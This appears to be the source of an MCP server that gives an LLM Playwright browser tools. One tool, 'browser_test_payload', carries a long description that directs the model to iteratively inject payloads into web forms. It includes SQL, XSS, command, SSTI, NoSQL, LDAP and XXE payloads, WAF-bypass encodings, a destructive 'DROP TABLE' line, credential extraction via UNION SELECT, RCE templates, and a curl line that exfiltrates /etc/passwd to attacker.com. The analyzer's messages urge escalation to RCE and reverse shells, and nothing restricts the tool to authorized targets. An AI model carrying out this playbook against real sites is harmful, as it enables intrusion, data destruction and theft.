#!/usr/bin/env node

import { Server } from "@modelcontextprotocol/sdk/server/index.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
import {
  CallToolRequestSchema,
  ListToolsRequestSchema,
} from "@modelcontextprotocol/sdk/types.js";
import { chromium, firefox, webkit, Browser, Page, BrowserContext } from 'playwright';
// import { promises as fs } from 'fs';
import path from 'path';

interface BrowserSession {
  id: string;
  browser: Browser;
  context: BrowserContext;
  page: Page;
  browserType: 'chromium' | 'firefox' | 'webkit';
}

// Simplified Payload Testing Types
interface PayloadTestResult {
  success: boolean;
  payload: string;
  isVulnerable: boolean;
  confidence: 'high' | 'medium' | 'low' | 'none';
  evidence: string[];
  detectedBehaviors: string[];
  responseAnalysis: {
    statusCode: number;
    responseTime: number;
    baselineTime: number;
    timeDifference: number;
    responseLengthChange: number;
  };
  recommendation: string;
}

class PayloadAnalyzer {
  static analyze(
    baseline: { status: number; body: string; time: number },
    testResult: { status: number; body: string; time: number },
    payload: string
  ): Omit<PayloadTestResult, 'success' | 'payload'> {

    const evidence: string[] = [];
    const behaviors: string[] = [];
    let isVulnerable = false;
    let confidence: 'high' | 'medium' | 'low' | 'none' = 'none';
    let recommendation = '';

    const timeDiff = testResult.time - baseline.time;
    const lengthDiff = Math.abs(testResult.body.length - baseline.body.length);

    // ============================================================================
    // SSTI (Server-Side Template Injection) Detection
    // ============================================================================

    // Math expression evaluation detection
    const mathPattern = /\{\{(\d+)\s*[\*\+\-\/]\s*(\d+)\}\}|\$\{(\d+)\s*[\*\+\-\/]\s*(\d+)\}|<%=\s*(\d+)\s*[\*\+\-\/]\s*(\d+)\s*%>/;
    const mathMatch = payload.match(mathPattern);

    if (mathMatch) {
      // Extract numbers and operator
      let num1, num2, operator;
      if (mathMatch[1] && mathMatch[2]) { // Jinja2/Twig: {{7*7}}
        num1 = parseInt(mathMatch[1]);
        num2 = parseInt(mathMatch[2]);
        operator = payload.match(/[\*\+\-\/]/)?.[0];
      } else if (mathMatch[3] && mathMatch[4]) { // Freemarker: ${7*7}
        num1 = parseInt(mathMatch[3]);
        num2 = parseInt(mathMatch[4]);
        operator = payload.match(/[\*\+\-\/]/)?.[0];
      } else if (mathMatch[5] && mathMatch[6]) { // ERB: <%= 7*7 %>
        num1 = parseInt(mathMatch[5]);
        num2 = parseInt(mathMatch[6]);
        operator = payload.match(/[\*\+\-\/]/)?.[0];
      }

      if (num1 && num2 && operator) {
        let expected: number;
        switch (operator) {
          case '*': expected = num1 * num2; break;
          case '+': expected = num1 + num2; break;
          case '-': expected = num1 - num2; break;
          case '/': expected = Math.floor(num1 / num2); break;
          default: expected = 0;
        }

        if (testResult.body.includes(String(expected)) && !baseline.body.includes(String(expected))) {
          isVulnerable = true;
          confidence = 'high';
          evidence.push(`SSTI: Mathematical expression evaluated (${num1}${operator}${num2} = ${expected})`);
          behaviors.push('SSTI_MATH_EVALUATION');
          recommendation = '✅ HIGH CONFIDENCE SSTI! Template engine is evaluating expressions. Try accessing configuration objects or executing code.';
        }
      }
    }

    // Template syntax reflection detection
    const templatePatterns = ['{{', '${', '<%=', '{%', '<#'];
    const hasTemplateMarkers = templatePatterns.some(marker => payload.includes(marker));

    if (hasTemplateMarkers && testResult.body.includes(payload) && !baseline.body.includes(payload)) {
      // Check if it's not just reflected but actually processed differently
      const configPatterns = ['config', '__class__', '__mro__', 'getClass', 'class.'];
      const hasConfigAccess = configPatterns.some(pattern => payload.toLowerCase().includes(pattern));

      if (hasConfigAccess && lengthDiff > 50) {
        isVulnerable = true;
        confidence = 'high';
        evidence.push('SSTI: Template configuration or class access detected in response');
        behaviors.push('SSTI_CONFIG_ACCESS');
        recommendation = '✅ HIGH CONFIDENCE SSTI! Configuration data exposed. Escalate to RCE exploitation.';
      }
    }

    // ============================================================================
    // XXE (XML External Entity) Detection
    // ============================================================================

    if (payload.includes('<!ENTITY') || payload.includes('<!DOCTYPE') || payload.includes('SYSTEM')) {

      // Unix/Linux file disclosure patterns
      const unixFilePatterns = [
        'root:x:', 'daemon:x:', 'bin:x:', // /etc/passwd entries
        'localhost', '127.0.0.1', // /etc/hosts entries
        'nameserver', 'domain', // /etc/resolv.conf
        '/bin/', '/usr/', '/etc/', // File paths
      ];

      // Windows file disclosure patterns
      const windowsFilePatterns = [
        '[boot loader]', '[operating systems]', // boot.ini
        'Windows Registry', 'HKEY_', // Windows registry
        'C:\\Windows', 'C:\\Program Files', // Windows paths
      ];

      const allFilePatterns = [...unixFilePatterns, ...windowsFilePatterns];

      for (const pattern of allFilePatterns) {
        if (testResult.body.includes(pattern) && !baseline.body.includes(pattern)) {
          isVulnerable = true;
          confidence = 'high';
          evidence.push(`XXE: File disclosure detected (pattern: "${pattern}")`);
          behaviors.push('XXE_FILE_DISCLOSURE');
          recommendation = '✅ HIGH CONFIDENCE XXE! External entity processed and file content disclosed. Try reading sensitive files or SSRF attacks.';
          break;
        }
      }

      // Check for error messages indicating XXE attempt
      const xxeErrors = [
        'entity', 'DOCTYPE', 'external entity', 'xml parse',
        'entity reference', 'undeclared entity'
      ];

      for (const error of xxeErrors) {
        if (testResult.body.toLowerCase().includes(error) && !baseline.body.toLowerCase().includes(error)) {
          if (confidence === 'none') {
            isVulnerable = true;
            confidence = 'medium';
            evidence.push(`XXE: XML parsing error detected (${error})`);
            behaviors.push('XXE_PARSE_ERROR');
            recommendation = '⚠️ POTENTIAL XXE! XML entity processing detected. Try different entity declarations or out-of-band techniques.';
          }
          break;
        }
      }
    }

    // ============================================================================
    // NoSQL Injection Detection
    // ============================================================================

    // MongoDB operator detection
    const nosqlOperators = ['$gt', '$lt', '$ne', '$eq', '$regex', '$where', '$exists', '$in', '$nin'];
    const hasNoSQLOperator = nosqlOperators.some(op => payload.includes(op));

    if (hasNoSQLOperator || payload.includes('{') && payload.includes('}')) {

      // Authentication bypass detection (401/403 -> 200)
      if ((baseline.status === 401 || baseline.status === 403) && testResult.status === 200) {
        isVulnerable = true;
        confidence = 'high';
        evidence.push(`NoSQL Injection: Authentication bypassed (${baseline.status} → 200)`);
        behaviors.push('NOSQL_AUTH_BYPASS');
        recommendation = '✅ HIGH CONFIDENCE NOSQL INJECTION! Authentication bypassed using operator injection. Try extracting data with regex operators.';
      }

      // Data extraction indicators
      if (lengthDiff > 200 && testResult.status === 200) {
        if (!isVulnerable) {
          isVulnerable = true;
          confidence = 'medium';
          evidence.push('NoSQL Injection: Significant data returned with operator payload');
          behaviors.push('NOSQL_DATA_EXTRACTION');
          recommendation = recommendation || '⚠️ POTENTIAL NOSQL INJECTION! Operator payload returned different data. Try regex-based blind extraction.';
        }
      }

      // Error messages
      const nosqlErrors = ['mongodb', 'mongoose', 'invalid operator', '$where', 'query error'];
      for (const error of nosqlErrors) {
        if (testResult.body.toLowerCase().includes(error) && !baseline.body.toLowerCase().includes(error)) {
          if (confidence === 'none') {
            isVulnerable = true;
            confidence = 'medium';
            evidence.push(`NoSQL error detected: ${error}`);
            behaviors.push('NOSQL_ERROR_MESSAGE');
            recommendation = recommendation || '⚠️ POTENTIAL NOSQL INJECTION! Database error exposed. Try different operator combinations.';
          }
          break;
        }
      }
    }

    // ============================================================================
    // LDAP Injection Detection
    // ============================================================================

    const ldapChars = ['*', '(', ')', '&', '|', '!'];
    const hasLDAPChars = ldapChars.some(char => payload.includes(char));

    if (hasLDAPChars && (payload.includes('*)') || payload.includes('(|') || payload.includes('(&'))) {

      // Authentication bypass (401/403 -> 200)
      if ((baseline.status === 401 || baseline.status === 403) && testResult.status === 200) {
        isVulnerable = true;
        confidence = 'high';
        evidence.push(`LDAP Injection: Authentication bypassed using filter manipulation`);
        behaviors.push('LDAP_AUTH_BYPASS');
        recommendation = '✅ HIGH CONFIDENCE LDAP INJECTION! LDAP filter bypassed. Try extracting directory information.';
      }

      // Different content with wildcard
      if (payload.includes('*') && lengthDiff > 100) {
        if (confidence === 'none') {
          isVulnerable = true;
          confidence = 'medium';
          evidence.push('LDAP Injection: Wildcard payload returned different content');
          behaviors.push('LDAP_WILDCARD_MATCH');
          recommendation = recommendation || '⚠️ POTENTIAL LDAP INJECTION! Wildcard filter accepted. Try extracting user attributes.';
        }
      }

      // LDAP error messages
      const ldapErrors = ['ldap', 'invalid dn', 'bad search filter', 'filter error'];
      for (const error of ldapErrors) {
        if (testResult.body.toLowerCase().includes(error)) {
          if (confidence === 'none') {
            evidence.push(`LDAP error detected: ${error}`);
            behaviors.push('LDAP_ERROR_MESSAGE');
            recommendation = recommendation || '💡 LDAP error detected. Application may be vulnerable to LDAP injection.';
          }
          break;
        }
      }
    }

    // ============================================================================
    // Command Injection Detection (Enhanced)
    // ============================================================================

    const commandChars = [';', '|', '&', '`', '$', '\n'];
    const hasCommandChars = commandChars.some(char => payload.includes(char));

    if (hasCommandChars) {

      // Command output patterns (Unix/Linux)
      const unixCommandOutputs = [
        'uid=', 'gid=', 'groups=', // id command
        'total ', 'drwx', '-rw-', // ls command
        'root', '/bin/bash', '/home/', // common outputs
        'Linux', 'GNU', 'Ubuntu', 'Debian', 'CentOS', // system info
      ];

      // Command output patterns (Windows)
      const windowsCommandOutputs = [
        'Volume Serial Number', 'Directory of', // dir command
        'Windows', 'Microsoft', 'C:\\', // system info
        'PING', 'Pinging', 'Reply from', // ping command
      ];

      const allCommandOutputs = [...unixCommandOutputs, ...windowsCommandOutputs];

      for (const output of allCommandOutputs) {
        if (testResult.body.includes(output) && !baseline.body.includes(output)) {
          isVulnerable = true;
          confidence = 'high';
          evidence.push(`Command Injection: Command output detected (${output})`);
          behaviors.push('COMMAND_INJECTION_OUTPUT');
          recommendation = '✅ HIGH CONFIDENCE COMMAND INJECTION! Command executed and output visible. Try executing more commands or reverse shell.';
          break;
        }
      }

      // Time-based blind command injection (handled by existing time-based detection)
      // But add specific recommendation for command injection
      if (timeDiff > 4000 && !recommendation.includes('COMMAND')) {
        if (payload.includes('sleep') || payload.includes('ping') || payload.includes('timeout')) {
          isVulnerable = true;
          confidence = 'high';
          evidence.push(`Command Injection (Blind): Time delay confirms command execution`);
          behaviors.push('COMMAND_INJECTION_BLIND');
          recommendation = '✅ HIGH CONFIDENCE BLIND COMMAND INJECTION! Time-based confirmation. Try data exfiltration via DNS or HTTP.';
        }
      }
    }

    // ============================================================================
    // SQL Injection Detection (Original - Moved Below)
    // ============================================================================
    const sqlErrors = [
      'sql syntax', 'mysql_', 'postgresql', 'ora-', 'sqlite', 'mssql',
      'unclosed quotation', 'quoted string not properly terminated',
      'syntax error', 'database error', 'warning: mysql', 'pg_query',
      'odbc', 'jdbc', 'oracle error'
    ];

    if (!isVulnerable) { // Only check if not already detected as another injection type
      for (const error of sqlErrors) {
        if (testResult.body.toLowerCase().includes(error)) {
          isVulnerable = true;
          confidence = 'high';
          evidence.push(`SQL error message detected: "${error}"`);
          behaviors.push('SQL_ERROR_MESSAGE');
          recommendation = '✅ HIGH CONFIDENCE SQL INJECTION! Try extracting data with UNION SELECT or use time-based blind techniques.';
          break;
        }
      }
    }

    // ============================================================================
    // XSS (Cross-Site Scripting) Detection
    // ============================================================================

    if (!isVulnerable && testResult.body.includes(payload)) { // Only check if not already detected
      const isEncodedOrFiltered = testResult.body.includes(payload.replace(/</g, '&lt;')) ||
                                   testResult.body.includes(payload.replace(/</g, '&#60;'));

      if (!isEncodedOrFiltered && (payload.includes('<') || payload.includes('script') || payload.includes('onerror'))) {
        isVulnerable = true;
        confidence = 'high';
        evidence.push('Payload reflected in response without proper encoding');
        behaviors.push('XSS_REFLECTION_UNENCODED');
        recommendation = '✅ HIGH CONFIDENCE XSS! Payload is reflected without encoding. Try executing JavaScript with different event handlers.';
      } else if (isEncodedOrFiltered) {
        evidence.push('Payload reflected but appears to be encoded/filtered');
        behaviors.push('XSS_REFLECTION_ENCODED');
        recommendation = '⚠️ Payload is reflected but encoded. Try bypass techniques: Unicode escaping, HTML entities, or alternative tags.';
        // Don't mark as vulnerable if encoded, just note it
      }
    }

    // Time-based Detection (Blind Injection)
    if (timeDiff > 4000) {
      isVulnerable = true;
      confidence = confidence === 'high' ? 'high' : 'medium';
      evidence.push(`Response delayed by ${timeDiff}ms (baseline: ${baseline.time}ms)`);
      behaviors.push('TIME_BASED_DELAY');
      recommendation = recommendation || `⚠️ POTENTIAL TIME-BASED INJECTION! Response delayed significantly. Verify with another time-based payload.`;
    }

    // Status Code Changes
    if (testResult.status !== baseline.status) {
      behaviors.push(`STATUS_CODE_CHANGE (${baseline.status} → ${testResult.status})`);
      evidence.push(`Status code changed from ${baseline.status} to ${testResult.status}`);

      if (testResult.status === 500) {
        isVulnerable = true;
        confidence = confidence === 'none' ? 'medium' : confidence;
        evidence.push('Server returned 500 Internal Server Error');
        behaviors.push('SERVER_ERROR');
        recommendation = recommendation || '⚠️ Server error triggered. Application may be vulnerable. Try different payload variations.';
      } else if (testResult.status === 403 || testResult.status === 406) {
        evidence.push('Payload was blocked by WAF or security filter');
        behaviors.push('WAF_DETECTED');
        recommendation = recommendation || '🛡️ WAF/Filter detected. Try encoding: URL (%27), HTML entities (&#39;), Unicode (\\u0027), or case variation.';
      }
    }

    // Response Length Significant Change
    if (lengthDiff > 100) {
      behaviors.push(`RESPONSE_LENGTH_CHANGE (${lengthDiff} bytes)`);
      evidence.push(`Response length changed by ${lengthDiff} bytes`);

      if (lengthDiff > 1000 && !isVulnerable) {
        // Significant change but not yet confirmed as vulnerability
        recommendation = recommendation || '💡 Significant response change detected. Inspect the response manually to verify vulnerability.';
      }
    }

    // No vulnerability detected
    if (!isVulnerable && evidence.length === 0) {
      recommendation = '❌ No vulnerability indicators detected. Try: 1) Different payload variations, 2) Alternative injection types, 3) Encoding techniques.';
    }

    return {
      isVulnerable,
      confidence,
      evidence,
      detectedBehaviors: behaviors,
      responseAnalysis: {
        statusCode: testResult.status,
        responseTime: testResult.time,
        baselineTime: baseline.time,
        timeDifference: timeDiff,
        responseLengthChange: lengthDiff
      },
      recommendation
    };
  }
}

class MCPBrowserServer {
  private server: Server;
  private sessions: Map<string, BrowserSession> = new Map();
  private defaultSessionId = 'default';

  constructor() {
    this.server = new Server(
      {
        name: "mcp-browser",
        version: "0.1.0",
      },
      {
        capabilities: {
          tools: {},
        },
      }
    );

    this.setupToolHandlers();
    
    this.server.onerror = (error) => console.error("[MCP Error]", error);
    process.on("SIGINT", async () => {
      await this.cleanup();
      await this.server.close();
      process.exit(0);
    });
  }

  private setupToolHandlers() {
    this.server.setRequestHandler(ListToolsRequestSchema, async () => ({
      tools: [
        {
          name: "browser_navigate",
          description: "Navigate to a URL in the browser",
          inputSchema: {
            type: "object",
            properties: {
              url: { type: "string", description: "URL to navigate to" },
              waitFor: { type: "string", enum: ["load", "domcontentloaded", "networkidle"], default: "load" },
              sessionId: { type: "string", description: "Browser session ID", default: "default" },
              browser: { type: "string", enum: ["chromium", "firefox", "webkit"], default: "chromium" },
              viewport: {
                type: "object",
                properties: {
                  width: { type: "number", default: 1280 },
                  height: { type: "number", default: 720 }
                }
              }
            },
            required: ["url"]
          }
        },
        {
          name: "browser_click",
          description: "Click on an element",
          inputSchema: {
            type: "object",
            properties: {
              selector: { type: "string", description: "CSS selector of element to click" },
              sessionId: { type: "string", default: "default" },
              waitFor: { type: "number", description: "Wait time after click (ms)", default: 1000 },
              force: { type: "boolean", description: "Force click even if element not visible", default: false }
            },
            required: ["selector"]
          }
        },
        {
          name: "browser_type",
          description: "Type text into an element",
          inputSchema: {
            type: "object",
            properties: {
              selector: { type: "string", description: "CSS selector of element to type into" },
              text: { type: "string", description: "Text to type" },
              sessionId: { type: "string", default: "default" },
              clear: { type: "boolean", description: "Clear existing text first", default: true },
              delay: { type: "number", description: "Delay between keystrokes (ms)", default: 50 }
            },
            required: ["selector", "text"]
          }
        },
        {
          name: "browser_screenshot",
          description: "Take a screenshot of the page or element",
          inputSchema: {
            type: "object",
            properties: {
              path: { type: "string", description: "Path to save screenshot" },
              sessionId: { type: "string", default: "default" },
              selector: { type: "string", description: "CSS selector to screenshot specific element" },
              fullPage: { type: "boolean", description: "Take full page screenshot", default: false },
              type: { type: "string", enum: ["png", "jpeg"], description: "Image format", default: "png" },
              quality: { type: "number", description: "JPEG quality (0-100, only for JPEG)", default: 90 }
            },
            required: ["path"]
          }
        },
        {
          name: "browser_extract_text",
          description: "Extract text content from elements",
          inputSchema: {
            type: "object",
            properties: {
              selector: { type: "string", description: "CSS selector of elements to extract text from" },
              sessionId: { type: "string", default: "default" },
              attribute: { type: "string", description: "Extract attribute instead of text" },
              multiple: { type: "boolean", description: "Extract from multiple matching elements", default: false }
            },
            required: ["selector"]
          }
        },
        {
          name: "browser_wait_for_element",
          description: "Wait for an element to appear",
          inputSchema: {
            type: "object",
            properties: {
              selector: { type: "string", description: "CSS selector to wait for" },
              sessionId: { type: "string", default: "default" },
              timeout: { type: "number", description: "Timeout in milliseconds", default: 30000 },
              state: { type: "string", enum: ["visible", "hidden", "attached", "detached"], default: "visible" }
            },
            required: ["selector"]
          }
        },
        {
          name: "browser_fill_form",
          description: "Fill out a form with multiple fields",
          inputSchema: {
            type: "object",
            properties: {
              fields: {
                type: "object",
                description: "Object with selector:value pairs",
                additionalProperties: { type: "string" }
              },
              sessionId: { type: "string", default: "default" },
              submitSelector: { type: "string", description: "Submit button selector" },
              waitAfterSubmit: { type: "number", description: "Wait time after submit (ms)", default: 3000 }
            },
            required: ["fields"]
          }
        },
        {
          name: "browser_scroll",
          description: "Scroll the page",
          inputSchema: {
            type: "object",
            properties: {
              direction: { type: "string", enum: ["up", "down", "left", "right", "top", "bottom"], default: "down" },
              pixels: { type: "number", description: "Pixels to scroll", default: 500 },
              sessionId: { type: "string", default: "default" },
              selector: { type: "string", description: "Scroll specific element instead of page" }
            }
          }
        },
        {
          name: "browser_get_page_info",
          description: "Get current page information (title, URL, etc.)",
          inputSchema: {
            type: "object",
            properties: {
              sessionId: { type: "string", default: "default" },
              includeMetrics: { type: "boolean", description: "Include performance metrics", default: false }
            }
          }
        },
        {
          name: "browser_execute_script",
          description: "Execute JavaScript on the page",
          inputSchema: {
            type: "object",
            properties: {
              script: { type: "string", description: "JavaScript code to execute" },
              sessionId: { type: "string", default: "default" },
              args: { type: "array", description: "Arguments to pass to script" }
            },
            required: ["script"]
          }
        },
        {
          name: "browser_intercept_requests",
          description: "Intercept and monitor network requests",
          inputSchema: {
            type: "object",
            properties: {
              urlPattern: { type: "string", description: "URL pattern to intercept (glob)", default: "**" },
              sessionId: { type: "string", default: "default" },
              mockResponse: {
                type: "object",
                description: "Mock response to return",
                properties: {
                  status: { type: "number" },
                  body: {},
                  headers: { type: "object" }
                }
              }
            }
          }
        },
        {
          name: "browser_download_file",
          description: "Download files from the page",
          inputSchema: {
            type: "object",
            properties: {
              triggerSelector: { type: "string", description: "Element that triggers download" },
              downloadPath: { type: "string", description: "Directory to save downloads" },
              sessionId: { type: "string", default: "default" },
              timeout: { type: "number", description: "Download timeout (ms)", default: 30000 }
            },
            required: ["triggerSelector", "downloadPath"]
          }
        },
        {
          name: "browser_mobile_emulate",
          description: "Emulate mobile device",
          inputSchema: {
            type: "object",
            properties: {
              device: { 
                type: "string", 
                enum: ["iPhone 12", "iPhone 13", "iPhone 14", "iPad", "Samsung Galaxy S21", "Pixel 5"],
                description: "Device to emulate"
              },
              sessionId: { type: "string", default: "default" },
              orientation: { type: "string", enum: ["portrait", "landscape"], default: "portrait" }
            },
            required: ["device"]
          }
        },
        {
          name: "browser_close_session",
          description: "Close a browser session",
          inputSchema: {
            type: "object",
            properties: {
              sessionId: { type: "string", default: "default" }
            }
          }
        },
        {
          name: "browser_create_pdf",
          description: "Generate PDF from current page",
          inputSchema: {
            type: "object",
            properties: {
              path: { type: "string", description: "Path to save PDF" },
              sessionId: { type: "string", default: "default" },
              format: { type: "string", enum: ["A4", "A3", "Letter"], default: "A4" },
              printBackground: { type: "boolean", default: true },
              margin: {
                type: "object",
                properties: {
                  top: { type: "string", default: "1cm" },
                  bottom: { type: "string", default: "1cm" },
                  left: { type: "string", default: "1cm" },
                  right: { type: "string", default: "1cm" }
                }
              }
            },
            required: ["path"]
          }
        },
        {
          name: "browser_test_payload",
          description: `INJECTION TESTING TOOL - Test a SINGLE payload against an input field and get detailed vulnerability analysis.

IMPORTANT: This tool tests ONE payload at a time. YOU (the LLM) must generate payloads iteratively based on results.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

COMPREHENSIVE INJECTION TESTING GUIDE FOR LLM

This guide teaches you HOW to perform security testing. Read carefully and follow the methodologies below.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SQL INJECTION TESTING

What is SQL Injection?
SQL injection occurs when user input is improperly incorporated into SQL queries, allowing attackers to manipulate database operations.

Testing Methodology:
1. START WITH BASIC PAYLOADS:
   - Single quote: '
   - Double quote: "
   - Boolean-based: ' OR '1'='1
   - Comment injection: admin'--
   - Numeric: 1 OR 1=1

2. IF BLOCKED, TRY ENCODING:
   - URL encoding: %27 ('), %22 ("), %20 (space)
   - HTML entities: &#39; ('), &#34; ("), &#32; (space)
   - Unicode: \\u0027 ('), \\u0022 (")
   - Double encoding: %2527 (%27)

3. WAF BYPASS TECHNIQUES:
   - Comment injection: '/**/OR/**/1=1--
   - Case variation: ' UnIoN SeLeCt NULL--
   - Newline: '%0AOR%0A1=1--
   - Alternative operators: ' || (concat in some DBs)

4. ADVANCED EXPLOITATION:
   - UNION-based: ' UNION SELECT NULL,NULL--
   - Time-based blind: ' OR SLEEP(5)--
   - Boolean blind: ' AND 1=1-- vs ' AND 1=2--
   - Stacked queries: '; DROP TABLE users--

Example Workflow:
Step 1: Test ' → Check if error occurs
Step 2: If blocked (403/406), try %27
Step 3: If error detected, try ' OR 1=1--
Step 4: If successful, escalate to UNION SELECT
Step 5: Extract data: ' UNION SELECT username,password FROM users--

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

CROSS-SITE SCRIPTING (XSS) TESTING

What is XSS?
XSS allows attackers to inject malicious JavaScript into web pages viewed by other users.

Testing Methodology:
1. START WITH BASIC PAYLOADS:
   - Simple alert: <script>alert(1)</script>
   - Image onerror: <img src=x onerror=alert(1)>
   - SVG onload: <svg onload=alert(1)>
   - Body onload: <body onload=alert(1)>

2. IF BLOCKED, TRY ENCODING:
   - URL encoding: %3Cscript%3Ealert(1)%3C/script%3E
   - HTML entities: &#60;script&#62;alert(1)&#60;/script&#62;
   - Unicode: \\u003cscript\\u003ealert(1)\\u003c/script\\u003e
   - Hex: \\x3cscript\\x3ealert(1)\\x3c/script\\x3e

3. WAF BYPASS TECHNIQUES:
   - Case variation: <ScRiPt>alert(1)</sCrIpT>
   - Tag obfuscation: <img/src=x/onerror=alert(1)>
   - Event handler variations: <img src=x onerror=\\u0061lert(1)>
   - Alternative tags: <details open ontoggle=alert(1)>

4. CONTEXT-SPECIFIC PAYLOADS:
   - Inside attribute: " onload="alert(1)
   - JavaScript context: ';alert(1);//
   - Inside <script>: </script><script>alert(1)</script>
   - DOM-based: javascript:alert(1)

Example Workflow:
Step 1: Test <script>alert(1)</script>
Step 2: Check if payload is reflected in response
Step 3: If encoded, try <img src=x onerror=alert(1)>
Step 4: If still blocked, use Unicode: <img src=x onerror=\\u0061lert(1)>
Step 5: Try polyglot: '"><script>alert(1)</script>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

COMMAND INJECTION TESTING

What is Command Injection?
Command injection allows attackers to execute arbitrary OS commands on the server.

Testing Methodology:
1. START WITH BASIC PAYLOADS:
   - Semicolon: ; ls
   - Pipe: | whoami
   - Ampersand: & id
   - Backticks: \`cat /etc/passwd\`
   - Dollar: \$(whoami)

2. BLIND COMMAND INJECTION (Time-based):
   - Sleep: ; sleep 5
   - Ping: & ping -c 5 127.0.0.1
   - Timeout: | timeout 5

3. ENCODING FOR BYPASS:
   - URL encoding: ;%20ls
   - Hex: \\x3bls
   - Variable expansion: $IFS (space bypass)

4. ADVANCED TECHNIQUES:
   - Newline: %0als
   - Command substitution: \$(cat /etc/passwd)
   - Input redirection: < /etc/passwd

Example Workflow:
Step 1: Test ; ls
Step 2: If blocked, try | whoami
Step 3: If no visible output, try blind: ; sleep 5
Step 4: If time delay detected, escalate: ; cat /etc/passwd
Step 5: Try exfiltration: ; curl http://attacker.com?data=\$(cat /etc/passwd)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SERVER-SIDE TEMPLATE INJECTION (SSTI) TESTING

What is SSTI?
SSTI occurs when user input is embedded into template engines without proper sanitization.

Testing Methodology:
1. DETECTION PAYLOADS:
   - Math expression: {{7*7}} (Jinja2, Twig)
   - Alternate syntax: \${7*7} (Freemarker, Thymeleaf)
   - ERB: <%= 7*7 %>

2. TEMPLATE ENGINE IDENTIFICATION:
   - Jinja2: {{7*'7'}} → 7777777
   - Twig: {{7*'7'}} → 49
   - Smarty: {7*7} → 49
   - Freemarker: \${7*7} → 49

3. EXPLOITATION:
   - Jinja2 RCE: {{config.items()}}
   - Python object access: {{''.__class__.__mro__[1].__subclasses__()}}
   - Freemarker RCE: <#assign ex="freemarker.template.utility.Execute"?new()> \${ex("whoami")}
   - ERB RCE: <%= system('cat /etc/passwd') %>

Example Workflow:
Step 1: Test {{7*7}}
Step 2: If result is 49, template engine detected
Step 3: Try {{config}} to get configuration
Step 4: Escalate to RCE: {{''.__class__.__mro__[1].__subclasses__()}}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

NOSQL INJECTION TESTING

What is NoSQL Injection?
NoSQL injection targets databases like MongoDB, allowing attackers to bypass authentication or extract data.

Testing Methodology:
1. AUTHENTICATION BYPASS:
   - Greater than: {"$gt": ""}
   - Not equal: {"$ne": null}
   - Exists: {"$exists": true}

2. OPERATOR INJECTION (URL params):
   - [$ne]=1
   - [$gt]=
   - [$regex]=.*

3. JAVASCRIPT INJECTION (MongoDB):
   - '; return true; var foo='bar
   - '; return this.password.match(/^admin/)//

Example Workflow:
Step 1: Test {"$gt": ""}
Step 2: If authentication bypassed, try extracting data
Step 3: Use regex for blind extraction: {"$regex": "^a"}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

LDAP INJECTION TESTING

What is LDAP Injection?
LDAP injection manipulates LDAP queries to bypass authentication or extract directory information.

Testing Methodology:
1. AUTHENTICATION BYPASS:
   - Wildcard: *
   - OR injection: *)(&
   - Full bypass: *)(uid=*))(|(uid=*

2. FILTER MANIPULATION:
   - admin*)((|userPassword=*)
   - *)(objectClass=*)

Example Workflow:
Step 1: Test *
Step 2: If successful, try admin*)(&
Step 3: Extract data with filter injection

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

XXE (XML EXTERNAL ENTITY) TESTING

What is XXE?
XXE vulnerabilities occur when XML parsers process external entity references, allowing file disclosure or SSRF.

Testing Methodology:
1. BASIC XXE:
   <?xml version="1.0"?>
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
   <foo>&xxe;</foo>

2. BLIND XXE (Out-of-band):
   <?xml version="1.0"?>
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]>
   <foo>&xxe;</foo>

3. PARAMETER ENTITY:
   <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

ITERATIVE TESTING WORKFLOW (HOW LLM SHOULD USE THIS TOOL)

Phase 1: RECONNAISSANCE
1. Navigate to target URL
2. Identify input fields (login, search, comment forms, etc.)
3. Understand the context (what type of input is expected)

Phase 2: INITIAL TESTING
4. Start with basic SQL injection: browser_test_payload(selector, "'")
5. Analyze the response.recommendation
6. Check response.isVulnerable and response.confidence

Phase 3: ITERATIVE EXPLOITATION
7. Based on recommendation, generate next payload
8. If WAF detected (403/406), use encoding
9. If SQL error detected, escalate to UNION SELECT
10. If time delay detected, use time-based blind
11. If reflected but encoded, try XSS bypass

Phase 4: COMPREHENSIVE TESTING
12. Test ALL injection types: SQL, XSS, Command, SSTI, NoSQL, LDAP, XXE
13. For each type, follow the methodology above
14. Document all findings with evidence

Phase 5: VERIFICATION
15. Take screenshots of successful exploits
16. Verify vulnerabilities manually if needed
17. Rate confidence levels

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

ENCODING REFERENCE (For WAF Bypass)

URL Encoding:
  ' → %27    " → %22    < → %3C    > → %3E    / → %2F
  space → %20    ; → %3B    | → %7C    & → %26

HTML Entities:
  ' → &#39;    " → &#34;    < → &#60;    > → &#62;

Unicode Escaping:
  ' → \\u0027    " → \\u0022    < → \\u003c    > → \\u003e

Double URL Encoding:
  ' → %2527    " → %2522    < → %253C

